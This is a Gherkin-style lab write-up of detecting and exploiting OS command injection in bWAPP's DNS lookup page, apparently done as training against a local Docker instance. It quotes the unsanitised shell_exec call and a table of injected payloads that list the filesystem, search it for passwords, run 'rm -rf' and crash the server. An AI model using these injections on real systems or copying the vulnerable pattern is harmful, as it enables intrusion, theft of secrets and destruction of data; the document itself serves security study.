Feature: Detect and exploit vulnerability OS Command Injection
  From the bWAPP application
  From the site localhost:80/bWAPP/commandi.php

  Background:
    Given I am running Manjaro GNU/Linux kernel 4.9.77-1-MANJARO
    And I am browsing in Firefox 57.0.4
    And I am runing bWAPP from docker container raesene/bwapp
    Given a PHP site with an input that says "DNS lookup: ____ -> Lookup"

  Scenario: Normal use case
    Given I am at the page bWAPP/commandi.php
    When I type a valid URL
    Then the IP address of that URL is printed
    When I type any text that is not a URL
    Then there is no output

  Scenario: Static detection
    When I look in the code for commandi.php
    Then I see the called function invokes shell_exec("nslookup  ")
    """
    $input = $_POST["target"]
    echo shell_exec("nslookup " . $input);
    """

  Scenario Outline: Dynamic detection and exploitation
    When I append ;<command> to "www.nsa.gov" in the input
    Then the <output> is rendered in the browser

    Examples:
      |       <command>    |       <output>                                  |
      | ls -lR /           | all files in / are listed recursively           |
      | grep -r password / | looks for all ocurrences of "password" in /     |
      | rm -rf             | nothing                                         |
      | vi                 | other pages don't load! server & docker crashed |
